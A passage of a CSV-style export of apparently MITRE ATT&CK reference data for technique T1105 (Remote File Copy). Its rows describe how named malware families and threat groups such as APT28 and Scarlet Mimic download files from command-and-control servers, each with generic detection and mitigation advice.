level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Pisloader,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1127,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0125|Remsec]] contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.[[CiteRef::Symantec Remsec IOCs]][[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1128,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","['[[Software/S0128|BADNEWS]] is capable of downloading additional files through C2 channels, including a new version of itself.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: BADNEWS,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1129,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0130|Unknown Logger]] is capable of downloading remote files.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Unknown Logger,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1130,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0023|CHOPSTICK]] is capable of performing remote file transmission.[[CiteRef::Crowdstrike DNC June 2016]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: CHOPSTICK, SPLM, ...","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1131,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] retrieves and executes an additional payload from its C2 server.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: JHUHUGIT, Seduploader, ...","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1132,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0117|XTunnel]] is capable of downloading additional files.[[CiteRef::Invincea XTunnel]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: XTunnel, X-Tunnel, XAPS","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1133,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0137|CORESHELL]] downloads another dropper from its C2 server.[[CiteRef::FireEye APT28]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: CORESHELL, SOURFACE","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1134,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","['After security appliances blocked one version of the [[Software/S0045|ADVSTORESHELL]] implant, [[Group/G0007|APT28]] actors compiled and delivered another [[Software/S0045|ADVSTORESHELL]] x64 backdoor.[[CiteRef::Kaspersky Sofacy]] [[Group/G0007|APT28]] also used a first-stage downloader to contact the C2 server to obtain the second-stage implant.[[CiteRef::Bitdefender APT28 Dec 2015]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1135,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0148|RTM]] can download additional files.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: RTM,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1136,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0077|CallMe]] has the capability to download a file to the victim from the C2 server.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: CallMe,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1137,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0078|Psylo]] has a command to download a file to the system from its C2 server.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Psylo,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1138,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","[""[[Software/S0079|MobileOrder]] has a command to download a file from the C2 server to the victim mobile device's SD card.[[CiteRef::Scarlet Mimic Jan 2016]]""]",['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: MobileOrder,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1139,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0082|Emissary]] has the capability to download files from the C2 server.[[CiteRef::Lotus Blossom Dec 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Emissary,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1140,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0055|RARSTONE]] downloads its backdoor component from a C2 server and loads it directly into memory.[[CiteRef::Aquino RARSTONE]]'],['Naikon'],['Naikon'],['G0019'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: RARSTONE,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1141,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","['[[Software/S0042|LOWBALL]] uses the Dropbox API to  request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the [[Software/S0042|LOWBALL]] malware.[[CiteRef::FireEye admin@338]]']",['admin@338'],['admin@338'],['G0018'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: LOWBALL,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1142,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0118|Nidiran]] can download and execute files.[[CiteRef::Symantec Backdoor.Nidiran]]'],['Suckfly'],['Suckfly'],['G0039'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Nidiran, Backdoor.Nidiran","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1143,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Group/G0051|FIN10]] has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.[[CiteRef::FireEye FIN10 June 2017]]'],['FIN10'],['FIN10'],['G0051'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1144,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","['[[Software/S0094|Trojan.Karagany]] can upload, download, and execute files on the victim.[[CiteRef::Symantec Dragonfly]]']",['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Trojan.Karagany,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
